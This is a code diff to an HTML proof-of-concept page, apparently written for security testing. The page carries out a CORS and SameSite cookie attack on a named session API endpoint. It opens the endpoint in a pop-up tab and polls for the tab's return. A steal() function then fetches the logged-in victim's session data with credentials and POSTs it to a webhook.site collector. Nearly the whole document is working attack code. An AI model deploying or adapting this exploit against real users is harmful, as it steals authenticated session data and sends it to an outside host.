@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>CORS PoC – top-level navigation trick</title>
+  <title>CORS PoC – top-level navigation trick (pop-in)</title>
   <style>
     body{font-family:Arial,Helvetica,sans-serif;margin:3rem}
     a.button{display:inline-block;background:#28a745;color:#fff;padding:.8rem 1.4rem;text-decoration:none;border-radius:4px}
@@ -10,7 +10,7 @@
   </style>
 </head>
 <body>
-  <h2>CORS PoC – DeLorean Drive (top-level nav trick)</h2>
+  <h2>CORS PoC – DeLorean Drive (pop-in tab)</h2>
 
   <!--  primed = we just came back from the navigation  -->
   <div id="primed" style="display:none">
@@ -21,32 +21,56 @@
   <!--  initial state  -->
   <div id="start">
     <p>Click the button to start (you must be logged in).</p>
-    <a class="button" href="#" onclick="prime()">1. Prime cookie & navigate</a>
+    <a class="button" href="#" onclick="prime()">1. Prime cookie & pop tab</a>
   </div>
 
   <script>
     const TARGET = 'https://delorean-drive-test.tomtomgroup.com/api/session';
     const EXFIL  = 'https://webhook.site/445b3885-da06-4d12-b4c2-477cc5d38aa6';
-    const MY_URL = location.origin + location.pathname;   // <- your GitHub-Pages URL
+    const MY_URL = location.origin + location.pathname;
 
-    /*  -----  part 1 : send user away and come back  ----- */
+    let pop = null;
+
+    /*  -----  part 1 : open JSON in new tab  ----- */
     function prime() {
-      // navigate to the JSON endpoint; the response will be ugly raw JSON, who cares.
-      // The important thing is that the browser carries the SameSite=Lax cookie.
-      location.href = TARGET + '?cb=' + Date.now();   // cache-bust
-      // We will come back via <meta refresh> injected below
+      pop = window.open(TARGET + '?cb=' + Date.now(), '_blank');
+      if (!pop) return alert('Allow pop-ups and try again.');
+      document.getElementById('start').innerHTML = '<p>Tab opened – waiting …</p>';
+      waitForReturn();
     }
 
-    /*  -----  part 2 : we came back, fetch while cookie still hot  ----- */
+    /*  -----  part 2 : poll until the tab loads our URL again  ----- */
+    function waitForReturn() {
+      const t = setInterval(() => {
+        try {
+          // can we read location.href? if yes, user is back on our origin
+          if (pop.location.href.startsWith(MY_URL)) {
+            clearInterval(t);
+            pop.close();
+            document.getElementById('start').style.display  = 'none';
+            document.getElementById('primed').style.display = 'block';
+            steal();
+          }
+        } catch (e) {
+          /* cross-origin DOMException – still on JSON page, ignore */
+        }
+      }, 500);
+
+      // safety time-out (10 s)
+      setTimeout(() => {
+        clearInterval(t);
+        if (!pop.closed) pop.close();
+        document.getElementById('start').innerHTML = '<p>⏱️ Timed out – cookie grace window may still be open; reload this page and try again.</p>';
+      }, 10000);
+    }
+
+    /*  -----  part 3 : fetch while cookie still hot  ----- */
     async function steal() {
       try {
         const res = await fetch(TARGET, {method:'GET', credentials:'include'});
         if (!res.ok) throw new Error(`HTTP ${res.status}`);
         const data = await res.json();
-
         document.getElementById('loot').textContent = JSON.stringify(data, null, 2);
-
-        // optional exfil
         fetch(EXFIL, {
           method : 'POST',
           body   : JSON.stringify(data),
@@ -57,19 +81,11 @@
       }
     }
 
-    /*  -----  bootstrap  ----- */
+    /*  -----  bootstrap : did we come back primed?  ----- */
     if (location.search.includes('primed=1')) {
-      // we are back from the navigation
-      document.getElementById('start').style.display   = 'none';
-      document.getElementById('primed').style.display  = 'block';
-      steal();                       // fire immediately
-    } else if (location.search.includes('cb=')) {
-      // we are still on the target JSON page – auto-return after 1 s
-      const meta       = document.createElement('meta');
-      meta.httpEquiv   = 'refresh';
-      meta.content     = '1;url=' + MY_URL + '?primed=1';
-      document.head.appendChild(meta);
-      document.body.innerHTML = '<p>Returning …</p>';
+      document.getElementById('start').style.display  = 'none';
+      document.getElementById('primed').style.display = 'block';
+      steal();
     }
   </script>
 </body>
